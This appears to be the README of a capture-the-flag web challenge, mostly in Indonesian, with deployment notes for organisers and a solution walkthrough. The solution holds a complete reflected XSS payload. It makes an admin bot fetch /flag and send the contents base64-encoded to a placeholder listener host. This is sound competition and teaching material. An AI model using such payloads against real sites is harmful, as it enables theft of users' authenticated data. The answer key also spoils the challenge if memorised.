# Under Construction

## Description
Please help us, we currently newbie on web development :(<br>
<br>
Author : Yeraisci

## Notes to Panitia
- Btw, ini soal reflected xss di param url meta http-equiv refresh (iseng aja)
- Peserta gadikasih berkas apapun, cuma link ke webservice
- Tinggal docker compose up gan, portnya menyesuaikan
- Terserah mau buat quals apa final
- Di file *under_construction/visit.js*, di line 8 diganti ke ip webservice pas deploy

## How to Solve ?
- Sebenernya cara gampangnya payload xss nya cuma img src ngeleak cookie admin
- Tapi, karena session cookie bawaan flask pake flag "HttpOnly" jadi pake cara lain
- Payload xss nya dibuat biar admin nge-fetch konten di /flag terus kirim ke server pemain
- Di kolom feedback, kirim payload seperti ini : 
```html
http://<IP WEBSERVICE>/notes?"><sCriPT>var xmlHttp = new XMLHttpRequest();xmlHttp.open( "GET", "/flag", false );xmlHttp.send( null );var url = "<IP SERVER LISTENER PEMAIN>/?a=" + btoa(xmlHttp.responseText); var x = document.createElement("img"); x.src = url; document.body.appendChild(x);</SCrIPt>
```
- Atau bisa juga lempar ke hookbin kalau gamau repot
- Terus tinggal liat di listenernya, baikin base64nya, terus decode, dapet flag
